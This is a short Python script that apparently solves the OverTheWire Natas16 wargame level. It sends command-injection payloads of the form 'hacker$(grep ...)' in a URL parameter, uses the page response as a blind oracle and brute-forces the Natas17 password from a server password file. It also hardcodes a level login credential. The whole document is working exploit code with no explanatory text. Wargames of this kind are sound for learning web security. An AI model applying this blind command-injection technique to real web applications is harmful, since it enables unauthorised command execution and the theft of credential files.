#!/bin/python3
# Description: Simple script to retrieve Natas17 password

import requests

from requests.auth import HTTPBasicAuth

# initialize varibles
auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
filteredchars = ''
passwd = ''
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

for char in chars:
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=hacker$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)

    if 'hacker' not in r.text:
        filteredchars += char
        print(filteredchars)

for i in range(32):
    for char in filteredchars:
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=hacker$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)',auth=auth)

        if 'hacker' not in r.text:
            passwd += char
            print(passwd)
            break
